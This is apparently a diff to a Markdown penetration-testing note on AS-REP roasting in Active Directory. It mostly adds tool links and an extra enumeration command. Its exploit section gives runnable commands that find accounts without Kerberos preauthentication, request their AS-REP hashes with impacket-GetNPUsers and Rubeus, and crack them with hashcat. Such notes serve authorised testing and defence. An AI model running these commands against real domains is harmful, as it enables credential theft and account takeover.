@@ -30,33 +30,34 @@ This attack can be performed without any initial domain account. Nevertheless, a
 
 ## Exploit
 
-To enumerate vulnerable accounts, use following command. It's also possible to do with with `BloodHound`.
+To enumerate vulnerable accounts, use following commands. It's also possible to do with with [BloodHound](https://github.com/BloodHoundAD/BloodHound).
 
 ```bash
+# Using ActiveDirectory PowerShell module from a domain joined computer.
+Get-ADUSer -Filter 'DoesNotRequirePreAuth -eq $true'
+
 # Using PowerView from a domain joined computer.
 Get-DomainUser -PreauthNotRequired -verbose
 ```
 
-If domain contains accounts vulnerable to AS-REP roasting, request the AS-REP for concerned domain users on a targeted domain controller with `Rubeus` or `impacket-GetNPUsers`.
+If domain contains accounts vulnerable to AS-REP roasting, request the AS-REP for concerned domain users on a targeted domain controller with [Rubeus](https://github.com/GhostPack/Rubeus) or [impacket-GetNPUsers](https://github.com/fortra/impacket).
 
 ```bash
 # From Kali.
-impacket-GetNPUsers -dc-ip $DC_IP -request -outputfile hashes.asreproast $DOMAIN/$USERNAME:$PASSWORD
+impacket-GetNPUsers -dc-ip $dc_ip -request -outputfile hashes.asreproast $domain/$username:$password
 
 # From a domain joined computer.
 .\Rubeus.exe asreproast /outfile:hashes.asreproast /nowrap
 
 # From a Windows computer not joined to the domain.
-.\Rubeus.exe asreproast /creduser:$DOMAIN\$USERNAME /credpassword:$PASSWORD /domain:$DOMAIN /dc:$DC_IP /outfile:hashes.asreproast /nowrap
+.\Rubeus.exe asreproast /creduser:$domain\$username /credpassword:$password /domain:$domain /dc:$dc_ip /outfile:hashes.asreproast /nowrap
 ```
 
-Then, crack the AS-REP hash. You can use `hashcat` to do that.
+Then, crack the AS-REP hash. You can use [hashcat](https://github.com/hashcat/hashcat) to do that.
 
 ```bash
 sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
-
-
 
 ## Recommendations
 
